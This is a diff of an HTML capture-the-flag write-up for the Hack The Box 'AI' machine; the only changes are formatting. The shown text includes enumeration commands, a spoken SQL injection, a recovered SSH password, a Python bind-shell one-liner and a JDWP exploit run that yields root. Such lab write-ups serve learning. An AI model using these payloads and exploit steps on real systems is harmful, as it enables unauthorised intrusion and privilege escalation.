@@ -101,7 +101,7 @@ At the time I did this box, I was only documenting with screenshots, so some dat
 <p>Said that, time to get our hands dirty.</p>
 <h2 id=nmap>Nmap</h2>
 <p>As always the enumeration starts by running Nmap:</p>
-<pre><code class=language-console data-lang=console># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
+<pre tabindex=0><code class=language-console data-lang=console># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
 Nmap scan report for ai.htb (10.10.10.163)
 Host is up (0.019s latency).
 Not shown: 998 closed ports
@@ -145,7 +145,7 @@ Some enumeration of it is carried.</p>
 <img src=https://ceso.github.io/images/htb/ai/1.1-web-rce-2.png class=center style=border-radius:8px>
 <h2 id=foothold>Foothold</h2>
 <p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -176,7 +176,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 <p>After a LOT of try-error (literally, I was never able to go beyond this if it wasn&rsquo;t for the help of <a href=https://www.hackthebox.eu/profile/10423>Interep</a> of both queries and different TTS (being I&rsquo;m not a native english speaker and neither I have a microphone), was used in the end <a href=https://www.text2speech.org/>Text 2 Speech</a>:</p>
 <img src=https://ceso.github.io/images/htb/ai/t2s.png class=center style=border-radius:8px>
 <p>getting as final SQL Injection the next:</p>
-<pre><code>User:
+<pre tabindex=0><code>User:
 Open single quote union select, username from users Comment Database
 Password:
 Open single quote union select, password from users Comment Database
@@ -184,10 +184,10 @@ Open single quote union select, password from users Comment Database
 <img src=https://ceso.github.io/images/htb/ai/command-ok-1.png class=center style=border-radius:8px>
 <img src=https://ceso.github.io/images/htb/ai/command-ok-2.png class=center style=border-radius:8px>
 <p>Then, was tried to login via ssh with the credentials:</p>
-<pre><code>user: alexa
+<pre tabindex=0><code>user: alexa
 passwd: H,Sq9t6}a&lt;)?q93_
 </code></pre><p>Getting a success:</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
 alexa@10.10.10.163's password: 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
 
@@ -218,7 +218,7 @@ alexa@AI:~$ wc -c user.txt
 33 user.txt
 </code></pre><h2 id=privilege-escalation>Privilege escalation</h2>
 <p>When is checked which net. services are listening, was found :8080:</p>
-<pre><code class=language-console data-lang=console>alexa@AI:~$ ss -punta
+<pre tabindex=0><code class=language-console data-lang=console>alexa@AI:~$ ss -punta
 Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
 :Port                 
 udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
@@ -246,12 +246,12 @@ tcp                 TIME-WAIT                0                     0            
 </code></pre><p>then an ssh tunnel with <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> was run to know which service it was, resulting in tomcat:</p>
 <img src=https://ceso.github.io/images/htb/ai/tomcat-tunnel.png class=center style=border-radius:8px>
 <p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href=https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html>JDWP</a> enabled:</p>
-<pre><code class=language-console data-lang=console>root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+<pre tabindex=0><code class=language-console data-lang=console>root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
 </code></pre><p>A quick search google gives a result the next <a href=https://www.exploit-db.com/exploits/46501>exploit</a></p>
 <p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
 </code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>
-<pre><code class=language-console data-lang=console>alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
+<pre tabindex=0><code class=language-console data-lang=console>alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
 [+] Targeting '127.0.0.1:8000'
 [+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
 [+] Found Runtime class: id=650
@@ -266,7 +266,7 @@ tcp                 TIME-WAIT                0                     0            
 [+] Runtime.exec() successful, retId=6f0
 [!] Command successfully executed
 </code></pre><p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
 ai.lnx.htb [10.10.10.163] 2222 (?) open
 bash: cannot set terminal process group (6086): Inappropriate ioctl for device
 bash: no job control in this shell
